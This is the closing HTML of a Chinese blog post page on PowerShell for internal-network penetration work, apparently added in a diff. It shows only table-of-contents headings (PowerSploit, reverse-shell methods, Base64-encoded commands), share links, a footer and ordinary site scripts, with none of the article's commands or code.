toc-level-5"><a class="toc-link" href="#PowerSploit%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.4.1.</span> <span class="toc-text">PowerSploit基本概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PowerSploit%E7%89%B9%E7%82%B9"><span class="toc-number">1.4.2.</span> <span class="toc-text">PowerSploit特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PowerSploit%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.4.3.</span> <span class="toc-text">PowerSploit下载</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PowerSploit%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.4.</span> <span class="toc-text">PowerSploit模块</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell%E5%8F%8D%E5%BC%B9shell%E5%B8%B8%E8%A7%81%E6%96%B9%E5%BC%8F"><span class="toc-number">1.5.</span> <span class="toc-text">powershell反弹shell常见方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Base64%E5%AF%B9PowerShell%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.</span> <span class="toc-text">使用Base64对PowerShell命令进行编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.7.</span> <span class="toc-text"></span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&text=内网学习--Powershell使用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&is_video=false&description=内网学习--Powershell使用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网学习--Powershell使用&body=Check out this article: http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&name=内网学习--Powershell使用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&t=内网学习--Powershell使用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018.12.8-2020
+    steady
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
